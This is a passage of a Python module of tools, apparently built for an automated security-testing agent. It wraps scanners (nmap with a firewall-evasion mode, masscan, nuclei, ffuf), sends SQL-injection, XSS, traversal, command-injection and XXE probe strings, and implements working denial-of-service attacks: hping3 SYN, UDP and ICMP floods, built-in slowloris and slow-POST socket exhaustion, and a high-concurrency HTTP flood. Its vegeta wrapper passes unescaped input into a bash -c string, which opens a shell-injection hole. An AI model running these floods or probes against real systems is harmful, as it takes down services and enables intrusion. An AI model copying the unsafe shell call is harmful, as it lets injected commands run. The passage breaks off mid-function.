from __future__ import annotations

import asyncio
import json
import os
import re
import shutil
import socket
import ssl
import statistics
import subprocess
import tempfile
import time
from urllib.parse import urljoin, urlparse

import aiohttp
from bs4 import BeautifulSoup


class ToolState:
    def __init__(self):
        self.findings: list[dict] = []
        self.baseline: dict[str, float] = {}
        self.discovered_endpoints: list[dict] = []
        self.tech_stack: dict = {}
        self.total_requests_sent: int = 0
        self.installed_tools: dict[str, str] = {}

    def detect_tools(self):
        tools = [
            "nmap", "masscan", "hping3", "nikto", "nuclei", "ffuf",
            "slowhttptest", "wrk", "bombardier", "vegeta", "k6", "siege",
            "ab", "sslyze", "dnsrecon", "dnsenum", "gobuster", "curl",
            "testssl.sh", "scapy",
        ]
        for t in tools:
            path = shutil.which(t)
            if path:
                self.installed_tools[t] = path
        return self.installed_tools


STATE = ToolState()


def _get_state() -> ToolState:
    return STATE


def reset_state():
    STATE.findings.clear()
    STATE.baseline.clear()
    STATE.discovered_endpoints.clear()
    STATE.tech_stack.clear()
    STATE.total_requests_sent = 0
    STATE.installed_tools.clear()
    STATE.detect_tools()


async def _run_cmd(cmd: list[str], timeout: int = 120, stdin_data: str | None = None) -> dict:
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            stdin=asyncio.subprocess.PIPE if stdin_data else None,
        )
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(input=stdin_data.encode() if stdin_data else None),
            timeout=timeout,
        )
        return {
            "exit_code": proc.returncode,
            "stdout": stdout.decode(errors="replace")[:15000],
            "stderr": stderr.decode(errors="replace")[:5000],
        }
    except asyncio.TimeoutError:
        try:
            proc.kill()
        except Exception:
            pass
        return {"error": "command_timed_out", "timeout_seconds": timeout}
    except FileNotFoundError:
        return {"error": f"tool_not_found: {cmd[0]}", "hint": f"install {cmd[0]} and ensure it is in PATH"}
    except Exception as e:
        return {"error": str(e), "error_type": type(e).__name__}


def _tool_available(name: str) -> bool:
    return name in STATE.installed_tools


async def detect_installed_tools() -> dict:
    STATE.detect_tools()
    return {
        "installed": list(STATE.installed_tools.keys()),
        "missing": [t for t in [
            "nmap", "masscan", "hping3", "nikto", "nuclei", "ffuf",
            "slowhttptest", "wrk", "bombardier", "vegeta", "k6", "siege",
            "ab", "sslyze", "dnsrecon", "curl",
        ] if t not in STATE.installed_tools],
        "total_available": len(STATE.installed_tools),
    }


async def http_request(
    url: str,
    method: str = "GET",
    headers: dict | None = None,
    body: str | None = None,
    timeout: int = 10,
    follow_redirects: bool = True,
) -> dict:
    try:
        start = time.monotonic()
        async with aiohttp.ClientSession() as session:
            kwargs: dict = {
                "timeout": aiohttp.ClientTimeout(total=timeout),
                "ssl": False,
                "allow_redirects": follow_redirects,
            }
            if headers:
                kwargs["headers"] = headers
            if body:
                kwargs["data"] = body
            async with session.request(method, url, **kwargs) as resp:
                elapsed = time.monotonic() - start
                body_bytes = await resp.read()
                STATE.total_requests_sent += 1
                resp_headers = dict(resp.headers)
                return {
                    "status_code": resp.status,
                    "headers": resp_headers,
                    "body_size_bytes": len(body_bytes),
                    "body_preview": body_bytes[:2000].decode(errors="replace"),
                    "response_time_ms": round(elapsed * 1000, 2),
                    "content_type": resp_headers.get("Content-Type", ""),
                    "server": resp_headers.get("Server", "unknown"),
                    "url": str(resp.url),
                }
    except Exception as e:
        return {"error": str(e), "error_type": type(e).__name__}


async def crawl_endpoints(url: str, depth: int = 2, max_pages: int = 50) -> dict:
    visited = set()
    endpoints = []
    queue = [(url, 0)]
    parsed_base = urlparse(url)

    async with aiohttp.ClientSession() as session:
        while queue and len(visited) < max_pages:
            current_url, current_depth = queue.pop(0)
            if current_url in visited or current_depth > depth:
                continue
            visited.add(current_url)

            try:
                start = time.monotonic()
                async with session.get(
                    current_url,
                    timeout=aiohttp.ClientTimeout(total=8),
                    ssl=False,
                    allow_redirects=True,
                ) as resp:
                    elapsed = time.monotonic() - start
                    body = await resp.text()
                    STATE.total_requests_sent += 1
                    endpoint = {
                        "url": current_url,
                        "status": resp.status,
                        "content_type": resp.headers.get("Content-Type", ""),
                        "size_bytes": len(body.encode()),
                        "response_time_ms": round(elapsed * 1000, 2),
                    }
                    endpoints.append(endpoint)

                    if "text/html" in resp.headers.get("Content-Type", ""):
                        soup = BeautifulSoup(body, "html.parser")
                        for tag in soup.find_all("a", href=True):
                            full_url = urljoin(current_url, tag["href"])
                            parsed = urlparse(full_url)
                            if parsed.netloc == parsed_base.netloc and full_url not in visited:
                                queue.append((full_url, current_depth + 1))
                        for form in soup.find_all("form"):
                            action = form.get("action", "")
                            form_url = urljoin(current_url, action) if action else current_url
                            inputs = []
                            for inp in form.find_all(["input", "textarea", "select"]):
                                inputs.append({
                                    "name": inp.get("name", ""),
                                    "type": inp.get("type", "text"),
                                })
                            endpoints.append({
                                "url": form_url,
                                "method": form.get("method", "GET").upper(),
                                "type": "form",
                                "inputs": inputs,
                            })
            except Exception:
                continue

    STATE.discovered_endpoints = endpoints
    return {
        "total_discovered": len(endpoints),
        "endpoints": endpoints[:100],
        "pages_crawled": len(visited),
    }


async def nmap_scan(
    target: str,
    scan_type: str = "service_version",
    ports: str = "",
    scripts: str = "",
    extra_args: str = "",
) -> dict:
    if not _tool_available("nmap"):
        return {"error": "nmap not installed"}

    cmd = ["nmap", "-oX", "-"]

    if scan_type == "service_version":
        cmd += ["-sV", "-sC"]
    elif scan_type == "syn_scan":
        cmd += ["-sS"]
    elif scan_type == "udp_scan":
        cmd += ["-sU", "--top-ports", "50"]
    elif scan_type == "aggressive":
        cmd += ["-A", "-T4"]
    elif scan_type == "vuln_scan":
        cmd += ["--script", "vuln"]
    elif scan_type == "os_detect":
        cmd += ["-O"]
    elif scan_type == "firewall_evasion":
        cmd += ["-sS", "-f", "--data-length", "50"]

    if ports:
        cmd += ["-p", ports]
    if scripts:
        cmd += ["--script", scripts]
    if extra_args:
        cmd += extra_args.split()
    cmd.append(target)

    result = await _run_cmd(cmd, timeout=300)
    if "error" in result:
        return result

    output = result["stdout"]
    ports_found = []
    for line in output.split("\n"):
        if "portid=" in line:
            port_match = re.search(r'portid="(\d+)"', line)
            proto_match = re.search(r'protocol="(\w+)"', line)
            state_match = re.search(r'state="(\w+)"', line)
            service_match = re.search(r'name="([^"]*)"', line)
            product_match = re.search(r'product="([^"]*)"', line)
            version_match = re.search(r'version="([^"]*)"', line)
            if port_match and state_match:
                ports_found.append({
                    "port": int(port_match.group(1)),
                    "protocol": proto_match.group(1) if proto_match else "",
                    "state": state_match.group(1),
                    "service": service_match.group(1) if service_match else "",
                    "product": product_match.group(1) if product_match else "",
                    "version": version_match.group(1) if version_match else "",
                })

    return {
        "target": target,
        "scan_type": scan_type,
        "ports_found": ports_found,
        "raw_output": output[:8000],
    }


async def masscan_scan(target: str, ports: str = "0-65535", rate: int = 1000) -> dict:
    if not _tool_available("masscan"):
        return {"error": "masscan not installed"}

    rate = min(rate, 100000)
    cmd = ["masscan", target, "-p", ports, "--rate", str(rate), "-oJ", "-"]
    result = await _run_cmd(cmd, timeout=300)
    if "error" in result:
        return result

    open_ports = []
    for line in result["stdout"].split("\n"):
        line = line.strip().rstrip(",")
        if line.startswith("{"):
            try:
                entry = json.loads(line)
                for p in entry.get("ports", []):
                    open_ports.append({
                        "port": p.get("port"),
                        "protocol": p.get("proto"),
                        "status": p.get("status"),
                    })
            except json.JSONDecodeError:
                continue

    return {
        "target": target,
        "rate": rate,
        "open_ports": open_ports,
        "total_open": len(open_ports),
    }


async def nuclei_scan(target: str, severity: str = "critical,high,medium", templates: str = "") -> dict:
    if not _tool_available("nuclei"):
        return {"error": "nuclei not installed"}

    cmd = ["nuclei", "-u", target, "-severity", severity, "-jsonl", "-silent"]
    if templates:
        cmd += ["-t", templates]
    result = await _run_cmd(cmd, timeout=600)
    if "error" in result:
        return result

    vulns = []
    for line in result["stdout"].split("\n"):
        line = line.strip()
        if line.startswith("{"):
            try:
                entry = json.loads(line)
                vulns.append({
                    "template_id": entry.get("template-id", ""),
                    "name": entry.get("info", {}).get("name", ""),
                    "severity": entry.get("info", {}).get("severity", ""),
                    "matched_at": entry.get("matched-at", ""),
                    "description": entry.get("info", {}).get("description", "")[:500],
                })
            except json.JSONDecodeError:
                continue

    return {
        "target": target,
        "vulnerabilities_found": len(vulns),
        "vulnerabilities": vulns,
    }


async def nikto_scan(target: str, tuning: str = "") -> dict:
    if not _tool_available("nikto"):
        return {"error": "nikto not installed"}

    cmd = ["nikto", "-h", target, "-Format", "json", "-output", "-"]
    if tuning:
        cmd += ["-Tuning", tuning]
    result = await _run_cmd(cmd, timeout=600)
    if "error" in result:
        return result

    return {
        "target": target,
        "raw_output": result["stdout"][:10000],
        "stderr": result["stderr"][:3000],
    }


async def ffuf_fuzz(
    url: str,
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    method: str = "GET",
    filter_status: str = "404",
    extra_args: str = "",
) -> dict:
    if not _tool_available("ffuf"):
        return {"error": "ffuf not installed"}

    cmd = [
        "ffuf", "-u", url, "-w", wordlist,
        "-mc", "all", "-fc", filter_status,
        "-o", "-", "-of", "json", "-s",
    ]
    if method != "GET":
        cmd += ["-X", method]
    if extra_args:
        cmd += extra_args.split()
    result = await _run_cmd(cmd, timeout=300)
    if "error" in result:
        return result

    findings = []
    try:
        data = json.loads(result["stdout"])
        for r in data.get("results", []):
            findings.append({
                "url": r.get("url", ""),
                "status": r.get("status", 0),
                "length": r.get("length", 0),
                "words": r.get("words", 0),
                "lines": r.get("lines", 0),
            })
    except json.JSONDecodeError:
        return {"raw_output": result["stdout"][:5000]}

    return {
        "url_pattern": url,
        "results_found": len(findings),
        "results": findings[:200],
    }


async def slowhttptest_attack(
    url: str,
    attack_type: str = "slowloris",
    num_connections: int = 1000,
    duration_seconds: int = 30,
    rate: int = 200,
) -> dict:
    if not _tool_available("slowhttptest"):
        if attack_type == "slowloris":
            parsed = urlparse(url)
            return await _builtin_slowloris(
                parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80),
                num_connections, duration_seconds,
            )
        elif attack_type == "slow_post":
            return await _builtin_slow_post(url, num_connections, duration_seconds)
        return {"error": "slowhttptest not installed, built-in fallback used but limited"}

    num_connections = min(num_connections, 5000)
    duration_seconds = min(duration_seconds, 120)

    cmd = ["slowhttptest"]
    if attack_type == "slowloris":
        cmd += ["-H"]
    elif attack_type == "slow_post":
        cmd += ["-B"]
    elif attack_type == "slow_read":
        cmd += ["-X"]
    elif attack_type == "range":
        cmd += ["-R"]

    with tempfile.NamedTemporaryFile(suffix=".csv", delete=False) as tmp:
        tmp_path = tmp.name

    cmd += [
        "-c", str(num_connections),
        "-r", str(rate),
        "-l", str(duration_seconds),
        "-i", "10",
        "-u", url,
        "-p", "3",
        "-o", tmp_path,
    ]

    result = await _run_cmd(cmd, timeout=duration_seconds + 30)

    csv_data = ""
    try:
        with open(tmp_path + ".csv", "r") as f:
            csv_data = f.read()
        os.unlink(tmp_path + ".csv")
    except Exception:
        pass
    try:
        os.unlink(tmp_path)
    except Exception:
        pass

    service_available = True
    if csv_data:
        lines = csv_data.strip().split("\n")
        if len(lines) > 1:
            last_line = lines[-1].split(",")
            if len(last_line) > 2:
                try:
                    service_available = int(last_line[2]) > 0
                except (ValueError, IndexError):
                    pass

    return {
        "url": url,
        "attack_type": attack_type,
        "connections": num_connections,
        "duration_seconds": duration_seconds,
        "service_available_at_end": service_available,
        "raw_output": result.get("stdout", "")[:5000],
        "assessment": "target_degraded_or_down" if not service_available else "target_survived",
    }


async def hping3_flood(
    target: str,
    port: int = 80,
    flood_type: str = "syn",
    duration_seconds: int = 10,
    extra_args: str = "",
) -> dict:
    if not _tool_available("hping3"):
        return {"error": "hping3 not installed - required for L4 attacks"}

    duration_seconds = min(duration_seconds, 60)
    cmd = ["hping3"]

    if flood_type == "syn":
        cmd += ["-S", "--flood", "-p", str(port)]
    elif flood_type == "udp":
        cmd += ["--udp", "--flood", "-p", str(port)]
    elif flood_type == "icmp":
        cmd += ["--icmp", "--flood"]
    elif flood_type == "ack":
        cmd += ["-A", "--flood", "-p", str(port)]
    elif flood_type == "rst":
        cmd += ["-R", "--flood", "-p", str(port)]
    elif flood_type == "xmas":
        cmd += ["-F", "-S", "-R", "-P", "-A", "-U", "--flood", "-p", str(port)]
    elif flood_type == "fin":
        cmd += ["-F", "--flood", "-p", str(port)]

    if extra_args:
        cmd += extra_args.split()
    cmd.append(target)

    result = await _run_cmd(cmd, timeout=duration_seconds + 5)
    return {
        "target": target,
        "port": port,
        "flood_type": flood_type,
        "duration_seconds": duration_seconds,
        "raw_output": result.get("stdout", "")[:3000] + result.get("stderr", "")[:3000],
    }


async def bombardier_load(
    url: str,
    connections: int = 200,
    duration_seconds: int = 15,
    method: str = "GET",
    body: str = "",
    rate: int = 0,
) -> dict:
    if not _tool_available("bombardier"):
        return {"error": "bombardier not installed"}

    connections = min(connections, 2000)
    duration_seconds = min(duration_seconds, 120)

    cmd = [
        "bombardier", "-c", str(connections),
        "-d", f"{duration_seconds}s",
        "-m", method,
        "--print", "result",
        "--format", "json",
    ]
    if body:
        cmd += ["-b", body]
    if rate > 0:
        cmd += ["-r", str(rate)]
    cmd.append(url)

    result = await _run_cmd(cmd, timeout=duration_seconds + 30)
    if "error" in result:
        return result

    try:
        data = json.loads(result["stdout"])
        return {
            "url": url,
            "connections": connections,
            "duration_seconds": duration_seconds,
            "requests_total": data.get("result", {}).get("numReqs", 0),
            "rps": data.get("result", {}).get("rps", {}).get("mean", 0),
            "latency_avg_ms": data.get("result", {}).get("latency", {}).get("mean", 0) / 1000,
            "latency_p99_ms": data.get("result", {}).get("latency", {}).get("percentiles", {}).get("99", 0) / 1000,
            "bytes_total": data.get("result", {}).get("bytesRead", 0),
            "status_distribution": data.get("result", {}).get("statusCodeDistribution", {}),
        }
    except (json.JSONDecodeError, KeyError):
        return {"raw_output": result["stdout"][:5000]}


async def vegeta_attack(
    url: str,
    rate: int = 500,
    duration_seconds: int = 10,
    method: str = "GET",
    headers: dict | None = None,
    body: str = "",
) -> dict:
    if not _tool_available("vegeta"):
        return {"error": "vegeta not installed"}

    duration_seconds = min(duration_seconds, 120)
    rate = min(rate, 10000)

    target_spec = f"{method} {url}\n"
    if headers:
        for k, v in headers.items():
            target_spec += f"{k}: {v}\n"
    if body:
        target_spec += f"@<STDIN>\n{body}"

    attack_cmd = f"echo '{target_spec}' | vegeta attack -rate={rate}/s -duration={duration_seconds}s | vegeta report -type=json"
    result = await _run_cmd(["bash", "-c", attack_cmd], timeout=duration_seconds + 30)
    if "error" in result:
        return result

    try:
        data = json.loads(result["stdout"])
        return {
            "url": url,
            "rate_per_second": rate,
            "duration_seconds": duration_seconds,
            "requests_total": data.get("requests", 0),
            "throughput_rps": data.get("throughput", 0),
            "success_ratio": data.get("success", 0),
            "latency_mean_ms": data.get("latencies", {}).get("mean", 0) / 1e6,
            "latency_p50_ms": data.get("latencies", {}).get("50th", 0) / 1e6,
            "latency_p95_ms": data.get("latencies", {}).get("95th", 0) / 1e6,
            "latency_p99_ms": data.get("latencies", {}).get("99th", 0) / 1e6,
            "latency_max_ms": data.get("latencies", {}).get("max", 0) / 1e6,
            "status_codes": data.get("status_codes", {}),
            "errors": data.get("errors", [])[:10],
        }
    except (json.JSONDecodeError, KeyError):
        return {"raw_output": result["stdout"][:5000]}


async def wrk_benchmark(
    url: str,
    threads: int = 4,
    connections: int = 100,
    duration_seconds: int = 15,
    script: str = "",
) -> dict:
    if not _tool_available("wrk"):
        return {"error": "wrk not installed"}

    connections = min(connections, 5000)
    duration_seconds = min(duration_seconds, 120)

    cmd = [
        "wrk", "-t", str(threads), "-c", str(connections),
        "-d", f"{duration_seconds}s", "--latency",
    ]
    if script:
        cmd += ["-s", script]
    cmd.append(url)

    result = await _run_cmd(cmd, timeout=duration_seconds + 30)
    if "error" in result:
        return result

    output = result["stdout"]
    parsed = {"url": url, "threads": threads, "connections": connections, "raw_output": output[:3000]}

    rps_match = re.search(r"Requests/sec:\s+([\d.]+)", output)
    if rps_match:
        parsed["requests_per_second"] = float(rps_match.group(1))

    transfer_match = re.search(r"Transfer/sec:\s+([\d.]+\w+)", output)
    if transfer_match:
        parsed["transfer_per_second"] = transfer_match.group(1)

    lat_match = re.search(r"Latency\s+([\d.]+\w+)\s+([\d.]+\w+)\s+([\d.]+\w+)", output)
    if lat_match:
        parsed["latency_avg"] = lat_match.group(1)
        parsed["latency_stdev"] = lat_match.group(2)
        parsed["latency_max"] = lat_match.group(3)

    return parsed


async def siege_load(
    url: str,
    concurrent: int = 50,
    duration_seconds: int = 15,
    extra_args: str = "",
) -> dict:
    if not _tool_available("siege"):
        return {"error": "siege not installed"}

    concurrent = min(concurrent, 1000)
    duration_seconds = min(duration_seconds, 120)

    cmd = [
        "siege", "-c", str(concurrent),
        "-t", f"{duration_seconds}S",
        "--no-parser", url,
    ]
    if extra_args:
        cmd += extra_args.split()

    result = await _run_cmd(cmd, timeout=duration_seconds + 30)
    return {
        "url": url,
        "concurrent": concurrent,
        "raw_output": result.get("stderr", "")[:5000] + result.get("stdout", "")[:5000],
    }


async def sslyze_scan(target: str) -> dict:
    if not _tool_available("sslyze"):
        return {"error": "sslyze not installed"}

    cmd = ["sslyze", "--json_out=-", target]
    result = await _run_cmd(cmd, timeout=120)
    if "error" in result:
        return result

    try:
        data = json.loads(result["stdout"])
        server_results = data.get("server_scan_results", [{}])
        if server_results:
            sr = server_results[0]
            scan_results = sr.get("scan_result", {})
            return {
                "target": target,
                "tls_versions": list(scan_results.keys()),
                "raw_summary": result["stdout"][:8000],
            }
    except (json.JSONDecodeError, KeyError, IndexError):
        pass

    return {"target": target, "raw_output": result["stdout"][:5000]}


async def dnsrecon_scan(domain: str, scan_type: str = "std") -> dict:
    if not _tool_available("dnsrecon"):
        return {"error": "dnsrecon not installed"}

    cmd = ["dnsrecon", "-d", domain, "-t", scan_type, "-j", "-"]
    result = await _run_cmd(cmd, timeout=120)
    if "error" in result:
        return result

    records = []
    try:
        data = json.loads(result["stdout"])
        for r in data:
            records.append({
                "type": r.get("type", ""),
                "name": r.get("name", ""),
                "address": r.get("address", ""),
            })
    except (json.JSONDecodeError, KeyError):
        return {"raw_output": result["stdout"][:5000]}

    return {"domain": domain, "records": records, "total": len(records)}


async def detect_tech(url: str) -> dict:
    result = await http_request(url)
    if "error" in result:
        return result

    headers = result.get("headers", {})
    tech = {
        "server": headers.get("Server", "unknown"),
        "powered_by": headers.get("X-Powered-By", "unknown"),
        "cdn": "unknown",
        "waf": "none_detected",
        "framework": "unknown",
        "language": "unknown",
    }

    server = headers.get("Server", "").lower()
    if "nginx" in server:
        tech["server_type"] = "nginx"
    elif "apache" in server:
        tech["server_type"] = "apache"
    elif "cloudflare" in server:
        tech["server_type"] = "cloudflare"
        tech["cdn"] = "cloudflare"
        tech["waf"] = "cloudflare"
    elif "iis" in server:
        tech["server_type"] = "iis"
        tech["language"] = "asp.net"

    cdn_headers = {
        "cf-ray": "cloudflare", "x-cdn": "generic_cdn",
        "x-cache": "cdn_cached", "x-amz-cf-id": "aws_cloudfront",
        "x-served-by": "fastly", "x-akamai-transformed": "akamai",
    }
    for header, cdn_name in cdn_headers.items():
        if header.lower() in {k.lower() for k in headers}:
            tech["cdn"] = cdn_name

    powered = headers.get("X-Powered-By", "").lower()
    if "php" in powered:
        tech["language"] = "php"
    elif "asp.net" in powered:
        tech["language"] = "asp.net"
    elif "express" in powered:
        tech["framework"] = "express"
        tech["language"] = "node.js"

    cookie_headers = headers.get("Set-Cookie", "")
    if "PHPSESSID" in cookie_headers:
        tech["language"] = "php"
    elif "JSESSIONID" in cookie_headers:
        tech["language"] = "java"
    elif "csrftoken" in cookie_headers:
        tech["framework"] = "django"
        tech["language"] = "python"

    security_headers = {
        "Strict-Transport-Security": headers.get("Strict-Transport-Security"),
        "X-Frame-Options": headers.get("X-Frame-Options"),
        "X-Content-Type-Options": headers.get("X-Content-Type-Options"),
        "Content-Security-Policy": headers.get("Content-Security-Policy"),
    }
    tech["security_headers_present"] = [k for k, v in security_headers.items() if v]
    tech["security_headers_missing"] = [k for k, v in security_headers.items() if not v]

    STATE.tech_stack = tech
    return tech


async def benchmark_endpoint(
    url: str, method: str = "GET", num_requests: int = 20,
    headers: dict | None = None, body: str | None = None,
) -> dict:
    times = []
    errors = 0
    statuses: dict[int, int] = {}

    async with aiohttp.ClientSession() as session:
        for _ in range(num_requests):
            try:
                start = time.monotonic()
                kwargs: dict = {"timeout": aiohttp.ClientTimeout(total=10), "ssl": False}
                if headers:
                    kwargs["headers"] = headers
                if body:
                    kwargs["data"] = body
                async with session.request(method, url, **kwargs) as resp:
                    await resp.read()
                    elapsed = (time.monotonic() - start) * 1000
                    times.append(elapsed)
                    statuses[resp.status] = statuses.get(resp.status, 0) + 1
                    STATE.total_requests_sent += 1
            except Exception:
                errors += 1

    if not times:
        return {"error": "all_requests_failed", "total_errors": errors}

    times.sort()
    result = {
        "url": url,
        "num_requests": num_requests,
        "avg_ms": round(statistics.mean(times), 2),
        "min_ms": round(min(times), 2),
        "max_ms": round(max(times), 2),
        "median_ms": round(statistics.median(times), 2),
        "p95_ms": round(times[int(len(times) * 0.95)], 2),
        "p99_ms": round(times[int(len(times) * 0.99)], 2),
        "std_dev_ms": round(statistics.stdev(times), 2) if len(times) > 1 else 0,
        "error_count": errors,
        "error_rate_pct": round(errors / num_requests * 100, 2),
        "status_distribution": statuses,
    }
    STATE.baseline[url] = result["avg_ms"]
    return result


async def test_rate_limit(url: str, num_requests: int = 100, delay_ms: int = 0) -> dict:
    statuses: dict[int, int] = {}
    blocked_at = None
    times = []

    async with aiohttp.ClientSession() as session:
        for i in range(num_requests):
            try:
                start = time.monotonic()
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
                    elapsed = (time.monotonic() - start) * 1000
                    times.append(elapsed)
                    statuses[resp.status] = statuses.get(resp.status, 0) + 1
                    STATE.total_requests_sent += 1
                    if resp.status == 429 and blocked_at is None:
                        blocked_at = i + 1
                    if delay_ms > 0:
                        await asyncio.sleep(delay_ms / 1000)
            except Exception:
                statuses[-1] = statuses.get(-1, 0) + 1

    rate_limited = 429 in statuses
    return {
        "url": url,
        "total_sent": num_requests,
        "rate_limited": rate_limited,
        "blocked_at_request": blocked_at,
        "status_distribution": statuses,
        "avg_response_ms": round(statistics.mean(times), 2) if times else None,
    }


async def detect_waf(url: str) -> dict:
    payloads = [
        ("sql_injection", "?id=1' OR '1'='1"),
        ("xss_probe", "?q=<script>alert(1)</script>"),
        ("path_traversal", "/../../etc/passwd"),
        ("command_injection", "?cmd=;ls+-la"),
        ("xxe_probe", "?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"),
    ]

    results = []
    waf_detected = False
    waf_evidence = []
    baseline_resp = await http_request(url)
    baseline_status = baseline_resp.get("status_code", 200)

    async with aiohttp.ClientSession() as session:
        for probe_name, payload in payloads:
            test_url = url.rstrip("/") + payload
            try:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5), ssl=False, allow_redirects=False) as resp:
                    STATE.total_requests_sent += 1
                    body = await resp.text()
                    blocked = False
                    if resp.status in (403, 406, 429, 503) and baseline_status not in (403, 406, 429, 503):
                        blocked = True
                    for sig in ["access denied", "blocked", "firewall", "waf", "captcha", "challenge", "security"]:
                        if sig in body.lower():
                            blocked = True
                            break
                    if blocked:
                        waf_detected = True
                        waf_evidence.append(probe_name)
                    results.append({"probe": probe_name, "status": resp.status, "blocked": blocked})
            except Exception:
                results.append({"probe": probe_name, "error": "request_failed"})

    return {
        "waf_detected": waf_detected,
        "waf_evidence": waf_evidence,
        "probe_results": results,
        "known_waf": STATE.tech_stack.get("waf", "unknown"),
    }


async def http_flood(
    url: str, method: str = "GET", concurrent: int = 100,
    duration_seconds: int = 15, headers: dict | None = None, body: str | None = None,
) -> dict:
    concurrent = min(concurrent, 1000)
    duration_seconds = min(duration_seconds, 120)

    total = 0
    success = 0
    errors = 0
    times = []
    statuses: dict[int, int] = {}
    sem = asyncio.Semaphore(concurrent)
    stop_event = asyncio.Event()

    async def _worker(session: aiohttp.ClientSession):
        nonlocal total, success, errors
        while not stop_event.is_set():
            async with sem:
                if stop_event.is_set():
                    break
                try:
                    kwargs: dict = {"timeout": aiohttp.ClientTimeout(total=10), "ssl": False}
                    if headers:
                        kwargs["headers"] = headers
                    if body:
                        kwargs["data"] = body
                    start = time.monotonic()
                    async with session.request(method, url, **kwargs) as resp:
                        await resp.read()
                        elapsed = (time.monotonic() - start) * 1000
                        total += 1
                        times.append(elapsed)
                        statuses[resp.status] = statuses.get(resp.status, 0) + 1
                        if 200 <= resp.status < 500:
                            success += 1
                        STATE.total_requests_sent += 1
                except Exception:
                    total += 1
                    errors += 1

    async with aiohttp.ClientSession() as session:
        workers = [asyncio.create_task(_worker(session)) for _ in range(concurrent)]
        await asyncio.sleep(duration_seconds)
        stop_event.set()
        await asyncio.gather(*workers, return_exceptions=True)

    return {
        "url": url,
        "concurrent": concurrent,
        "duration_seconds": duration_seconds,
        "total_requests": total,
        "successful": success,
        "errors": errors,
        "rps": round(total / max(duration_seconds, 1), 2),
        "avg_ms": round(statistics.mean(times), 2) if times else None,
        "p95_ms": round(sorted(times)[int(len(times) * 0.95)], 2) if len(times) > 1 else None,
        "status_distribution": statuses,
        "error_rate_pct": round(errors / max(total, 1) * 100, 2),
    }


async def _builtin_slowloris(host: str, port: int = 80, num_connections: int = 500, duration_seconds: int = 30) -> dict:
    num_connections = min(num_connections, 2000)
    duration_seconds = min(duration_seconds, 120)
    sockets: list[socket.socket] = []
    connected = 0

    def _create(h: str, p: int) -> socket.socket | None:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if p == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=h)
            s.connect((h, p))
            s.send(f"GET /?{time.monotonic()} HTTP/1.1\r\n".encode())
            s.send(f"Host: {h}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            return s
        except Exception:
            return None

    loop = asyncio.get_event_loop()
    tasks = [loop.run_in_executor(None, _create, host, port) for _ in range(num_connections)]
    results = await asyncio.gather(*tasks)
    for s in results:
        if s is not None:
            sockets.append(s)
            connected += 1

    start_time = time.monotonic()
    rounds = 0
    maintained = connected

    while time.monotonic() - start_time < duration_seconds and sockets:
        rounds += 1
        alive = []
        for s in sockets:
            try:
                s.send(f"X-a: {rounds}\r\n".encode())
                alive.append(s)
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass
        sockets = alive
        maintained = len(sockets)
        await asyncio.sleep(1)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    return {
        "host": host,
        "port": port,
        "type": "slowloris_builtin",
        "initial_connections": connected,
        "final_maintained": maintained,
        "keep_alive_rounds": rounds,
        "assessment": "vulnerable" if maintained > num_connections * 0.3 else "resistant",
    }


async def _builtin_slow_post(url: str, num_connections: int = 200, duration_seconds: int = 30) -> dict:
    num_connections = min(num_connections, 1000)
    duration_seconds = min(duration_seconds, 120)
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"
    sockets: list[socket.socket] = []
    connected = 0

    def _create():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if parsed.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.connect((host, port))
            s.send(f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100000\r\n\r\n".encode())
            return s
        except Exception:
            return None

    loop = asyncio.get_event_loop()
    tasks = [loop.run_in_executor(None, _create) for _ in range(num_connections)]
    results = await asyncio.gather(*tasks)
    for s in results:
        if s is not None:
            sockets.append(s)
            connected += 1

    start_time = time.monotonic()
    rounds = 0
    maintained = connected
    bytes_sent = 0

    while time.monotonic() - start_time < duration_seconds and sockets:
        rounds += 1
        alive = []
        for s in sockets:
            try:
                s.send(b"A")
                bytes_sent += 1
                alive.append(s)
            except Exception:
                try:
                    s.close()
                except Exception:
                    pass
        sockets = alive
        maintained = len(sockets)
        await asyncio.sleep(1)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    return {
        "url": url,
        "type": "slow_post_builtin",
        "initial_connections": connected,
        "final_maintained": maintained,
        "bytes_trickled": bytes_sent,
        "assessment": "vulnerable" if maintained > num_connections * 0.3 else "resistant",
    }


async def check_alive(url: str, timeout: int = 5) -> dict:
    start = time.monotonic()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout), ssl=False) as resp:
                elapsed = (time.monotonic() - start) * 1000
                STATE.total_requests_sent += 1
                baseline = STATE.baseline.get(url, elapsed)
                degradation = round((elapsed / baseline - 1) * 100, 2) if baseline > 0 else 0
                return {
                    "alive": True,
                    "status_code": resp.status,
                    "response_time_ms": round(elapsed, 2),
                    "baseline_ms": round(baseline, 2),
                    "degradation_pct": degradation,
                }
    except Exception as e:
        return {
            "alive": False,
            "error": str(e),
            "response_time_ms": round((time.monotonic() - start) * 1000, 2),
        }


async def log_finding(
    title: str, severity: str, description: str,
    evidence: str = "", recommendation: str = "",
) -> dict:
    finding = {
        "id": len(STATE.findings) + 1,
        "title": title,
        "severity": severity.upper(),
        "description": description,
        "evidence": evidence,
        "recommendation": recommendation,
